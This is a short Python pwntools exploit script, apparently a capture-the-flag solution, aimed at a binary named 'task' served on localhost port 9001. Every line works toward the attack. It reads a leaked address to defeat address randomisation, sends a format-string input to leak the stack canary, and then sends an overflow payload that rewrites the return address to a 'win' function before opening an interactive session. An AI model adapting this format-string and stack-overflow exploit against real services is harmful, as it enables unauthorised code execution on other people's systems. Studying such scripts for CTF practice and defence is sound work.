#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["setup"]

p.sendline(b"%11$p")
canary = int(p.recv().decode(), 16)

payload = b"A" * 0x28
payload += p64(canary) + p64(0)
payload += p64(elf.symbols["win"]+0x8)

p.sendline(payload)

p.interactive()
